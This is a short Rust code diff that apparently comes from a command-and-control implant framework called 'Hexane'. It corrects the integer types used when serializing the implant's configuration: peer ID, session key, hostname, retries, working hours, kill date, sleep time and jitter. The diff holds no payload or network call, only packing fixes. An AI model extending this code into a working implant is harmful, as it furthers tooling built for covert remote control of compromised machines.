@@ -80,7 +80,7 @@ impl Hexane {
         stream.pack_uint32(self.peer_id);
         stream.pack_bytes(&self.session_key);
         stream.pack_string(&self.main_cfg.hostname);
-        stream.pack_int32(self.main_cfg.retries);
+        stream.pack_uint32(self.main_cfg.retries);
 
         let working_hours = self.main_cfg.working_hours
             .as_ref()
@@ -92,8 +92,8 @@ impl Hexane {
             .map_or(Ok(0), |date| i64::from_str(date))
             .unwrap();
 
-        stream.pack_int32(working_hours);
-        stream.pack_uint3264(kill_date);
+        stream.pack_uint32(working_hours);
+        stream.pack_uint64(kill_date);
         stream.pack_uint32(self.main_cfg.sleeptime);
         stream.pack_uint32(self.main_cfg.jitter as u32);
 
